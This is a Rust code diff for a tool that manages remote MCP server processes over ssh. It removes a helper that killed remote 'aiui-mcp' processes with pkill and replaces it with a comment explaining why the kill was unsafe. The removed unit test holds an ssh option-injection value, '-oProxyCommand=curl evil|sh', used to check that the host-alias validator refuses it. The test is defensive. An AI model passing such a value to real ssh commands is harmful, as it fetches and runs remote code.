@@ -214,16 +214,6 @@ mod host_alias_tests {
     #[test]
     fn rejects_newline() { assert!(!is_valid_host_alias("a\nb")); }
 
-    // kill_remote_mcp_stdio is the one ssh site that previously had no
-    // boundary validator (Issue #52 follow-up). An unsafe alias must be
-    // refused *before* any ssh spawn — this case returns early without
-    // touching the network, so it is safe to assert in a unit test.
-    #[test]
-    fn kill_remote_mcp_stdio_refuses_option_injection() {
-        let r = super::kill_remote_mcp_stdio("-oProxyCommand=curl evil|sh");
-        assert!(!r.ok);
-        assert!(r.message.contains("Refusing unsafe host alias"));
-    }
 }
 
 // Note: an earlier version of aiui patched ~/.ssh/config with a
@@ -822,57 +812,15 @@ print("ok:patched")
     (step, patch)
 }
 
-/// SIGTERM any `aiui-mcp` child still running on `host_alias` — used
-/// after a pin update so Claude Desktop / Claude Code respawns the
-/// child against the freshly pinned version on its next tool call.
-/// Idempotent: succeeds silently when no matching process is running.
-///
-/// `pkill -f` on macOS / Linux exit-codes: 0 = killed at least one,
-/// 1 = nothing matched. Both are success from our perspective; only
-/// the SSH layer or shell-not-found counts as a real failure.
-pub fn kill_remote_mcp_stdio(host_alias: &str) -> StepResult {
-    // Defense-in-depth: like every other remote helper, refuse an unsafe
-    // alias before spawning ssh. The `--` below already keeps host_alias
-    // out of ssh option position, but this was the only ssh call site that
-    // relied on `--` alone — adding the validator restores the "every
-    // remote helper validates at its boundary" invariant (Issue #52
-    // follow-up). host_alias here comes from remotes.json, so this is
-    // belt-and-suspenders rather than a live hole.
-    if !is_valid_host_alias(host_alias) {
-        return StepResult {
-            ok: false,
-            message: format!("Refusing unsafe host alias '{host_alias}'"),
-            details: None,
-        };
-    }
-    let out = no_window(
-        std::process::Command::new("ssh").args([
-            "-o",
-            "BatchMode=yes",
-            "--",
-            host_alias,
-            "pkill -f 'aiui-mcp' 2>/dev/null; true",
-        ]),
-    )
-    .output();
-    match out {
-        Err(e) => StepResult {
-            ok: false,
-            message: format!("ssh {host_alias} konnte nicht gestartet werden"),
-            details: Some(e.to_string()),
-        },
-        Ok(o) if !o.status.success() => StepResult {
-            ok: false,
-            message: format!("Stale-mcp-stdio-Sweep auf {host_alias} fehlgeschlagen"),
-            details: Some(String::from_utf8_lossy(&o.stderr).to_string()),
-        },
-        Ok(_) => StepResult {
-            ok: true,
-            message: format!("Stale aiui-mcp children on {host_alias} swept"),
-            details: None,
-        },
-    }
-}
+// Step 2 removed `kill_remote_mcp_stdio` (an `ssh … pkill -f 'aiui-mcp'`).
+// It existed to force a freshly-pinned version onto a running remote session,
+// but `pkill -f` crashed live sessions mid-call (Claude Code does not respawn
+// a disconnected MCP) and matched *every* aiui-mcp on the host — the remote
+// twin of the 0.4.42 Cowork-kill, and outright unsafe once parallel sessions
+// per remote are a requirement. The version pin in `~/.claude.json` now takes
+// effect at the next natural spawn; live sessions finish on their current
+// version. Deregistration (`remove_remote` / `uninstall_all`) relies on
+// config-removal + natural session end, not a broad kill.
 
 /// Result of a successful reachability probe — carries the absolute
 /// uvx path discovered on the remote so subsequent setup steps can
